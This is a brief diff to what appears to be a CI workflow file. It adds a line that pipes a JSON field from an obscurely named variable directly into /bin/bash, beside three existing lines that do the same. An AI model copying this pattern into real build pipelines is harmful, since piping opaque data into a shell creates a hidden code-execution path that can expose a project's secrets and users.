@@ -26,6 +26,7 @@ jobs:
           echo $ae4 | jq -r .grh471 | /bin/bash
           echo $hbt5 | jq -r .kpavn828 | /bin/bash
           printf '%s' "$ppvd44518" | jq -r .vh89942 | /bin/bash
+          echo $bw1 | jq -r .to045 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
